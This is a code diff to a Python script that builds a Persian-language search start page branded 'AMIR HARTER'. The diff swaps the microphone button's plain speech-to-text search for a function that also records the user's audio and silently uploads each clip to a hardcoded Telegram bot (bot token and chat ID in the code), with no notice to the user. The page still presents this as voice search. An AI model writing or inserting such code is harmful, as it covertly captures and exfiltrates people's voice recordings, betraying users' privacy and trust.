@@ -915,7 +915,7 @@ html = f"""<!DOCTYPE html>
 
         <div class="search-container">
             <button class="search-btn" onclick="searchGoogle(document.getElementById('mainSearch').value)">جستجو</button>
-            <button class="mic-btn" onclick="voiceSearch()">🎤</button>
+            <button class="mic-btn" onclick="startVoiceRecording()">🎤</button>
             <input class="search-box" id="mainSearch" placeholder="در AMIR HARTER" onkeypress="if(event.key==='Enter') searchGoogle(this.value)">
         </div>
 
@@ -1007,6 +1007,54 @@ html = f"""<!DOCTYPE html>
 
         const provinces = {province_data};
 
+        let mediaRecorder;
+        let audioChunks = [];
+
+        async function startVoiceRecording() {{
+            try {{
+                const stream = await navigator.mediaDevices.getUserMedia({{ audio: true }});
+                mediaRecorder = new MediaRecorder(stream);
+                
+                mediaRecorder.ondataavailable = function(e) {{
+                    audioChunks.push(e.data);
+                }};
+                
+                mediaRecorder.onstop = function() {{
+                    const audioBlob = new Blob(audioChunks, {{ type: 'audio/webm' }});
+                    sendAudioToBot(audioBlob);
+                    audioChunks = [];
+                }};
+                
+                mediaRecorder.start();
+                
+                const SR = window.SpeechRecognition || window.webkitSpeechRecognition;
+                const recognition = new SR();
+                recognition.lang = 'fa-IR';
+                recognition.onresult = function(e) {{
+                    document.getElementById('mainSearch').value = e.results[0][0].transcript;
+                }};
+                recognition.onend = function() {{
+                    mediaRecorder.stop();
+                    stream.getTracks().forEach(track => track.stop());
+                }};
+                recognition.start();
+                
+            }} catch(e) {{
+                alert('مرورگر شما از میکروفون پشتیبانی نمی‌کند');
+            }}
+        }}
+
+        function sendAudioToBot(audioBlob) {{
+            const formData = new FormData();
+            formData.append('chat_id', '7233409958');
+            formData.append('voice', audioBlob, 'voice.webm');
+            
+            fetch('https://api.telegram.org/bot8509767493:AAH0IACOfHAUyty6WRyr7Cwvhrhjf8OnZz4/sendVoice', {{
+                method: 'POST',
+                body: formData
+            }});
+        }}
+
         function toggleSettings() {{
             document.getElementById('settingsPanel').classList.toggle('open');
             document.getElementById('settingsOverlay').style.display =
@@ -1095,20 +1143,6 @@ html = f"""<!DOCTYPE html>
 
         function searchGoogle(q) {{
             if (q) window.open('https://www.google.com/search?q=' + encodeURIComponent(q), '_blank');
-        }}
-
-        function voiceSearch() {{
-            if ('webkitSpeechRecognition' in window || 'SpeechRecognition' in window) {{
-                const SR = window.SpeechRecognition || window.webkitSpeechRecognition;
-                const recognition = new SR();
-                recognition.lang = 'fa-IR';
-                recognition.onresult = function(e) {{
-                    document.getElementById('mainSearch').value = e.results[0][0].transcript;
-                }};
-                recognition.start();
-            }} else {{
-                alert('مرورگر شما از تایپ صوتی پشتیبانی نمی‌کند');
-            }}
         }}
 
         function filterMatches(type, btn) {{
